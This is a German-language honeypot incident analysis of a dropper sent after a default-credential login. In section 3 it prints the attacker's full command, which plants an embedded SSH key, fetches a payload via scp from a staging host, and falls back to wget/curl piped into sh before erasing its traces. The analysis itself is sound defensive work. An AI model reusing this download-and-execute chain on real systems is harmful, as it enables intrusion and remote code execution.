## 1. Zusammenfassung

Nach einem Login mit Standard-Zugangsdaten (`admin`) schickte der Angreifer eine einzige Kommandozeile. Sie schreibt einen **mitgebrachten privaten SSH-Schlüssel** auf das Zielsystem und holt damit per `scp` eine Payload von einem Staging-Server. Scheitert das, fällt sie auf `wget`/`curl` über HTTPS zurück und pipt das Ergebnis direkt in `sh`. Danach löscht sie alle Hilfsdateien. In der Emulation wurde weder `scp` noch der HTTPS-Fallback ausgeführt. Cowrie hat nur die beiden per Umleitung geschriebenen Dateien gespeichert.

## 3. Kommando (Schlüssel und Adressen entfernt)

```text
uname -a;
echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A";            # dekodiert: "auth_ok"
cd /tmp || cd /var/tmp || cd /dev/shm;
echo '-----BEGIN OPENSSH PRIVATE KEY----- <REDACTED> -----END OPENSSH PRIVATE KEY-----' > key.ppk;
echo 'StrictHostKeyChecking no\nUserKnownHostsFile /dev/null' > sshcfg;
chmod 400 key.ppk;
scp -s -F sshcfg -i key.ppk dlr@STAGING-02:sh out_sh;
if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1;
else (wget --no-check-certificate -qO- hxxps://STAGING-02/sh || curl -sk hxxps://STAGING-02/sh) | sh -s ssh; fi;
rm -rf sshcfg key.ppk out_sh
```

| Merkmal | Bedeutung |
|---|---|
| hex-kodiertes `auth_ok` | Rückmeldung an den Angreifer, dass Login und Shell funktionieren (durch die Kodierung taucht der Klartext nicht im Kommando auf) |
| Fallback `/tmp` → `/var/tmp` → `/dev/shm` | robustes Staging in beschreibbaren Verzeichnissen |
| eigener Ed25519-Key (Kommentar `dlr@sftp`), SFTP-Modus `scp -s`, Host-Key-Prüfung aus | Payload-Transfer über SSH – unauffälliger als HTTP und unabhängig von wget/curl |
| HTTPS-Fallback mit `--no-check-certificate` / `-k` direkt in `sh` | Ausführung ohne Zwischenspeicherung |
| Argument `ssh` an das Skript | die Payload erhält den Infektionsweg als Parameter (*Hypothese:* für Statistik oder Verbreitungslogik) |
| `rm -rf sshcfg key.ppk out_sh` | Spurenbeseitigung |

## 8. Analyst Conclusion

Professionell gebauter, fehlertoleranter Dropper mit zwei Transportwegen. Der primäre Weg über SSH mit eingebettetem Schlüssel umgeht Umgebungen ohne wget/curl und fällt in Netzwerk-Logs weniger auf als HTTP. Im Honeypot blieb er folgenlos. Selbst ohne Emulation hätte die Egress-Sperre sowohl `scp` als auch HTTPS blockiert.

**Maßnahmen:** Regel 110224 (umgesetzt). Optional: Regel für Staging-Verzeichnisse (`/tmp`, `/var/tmp`, `/dev/shm`) kombiniert mit Ausführung.
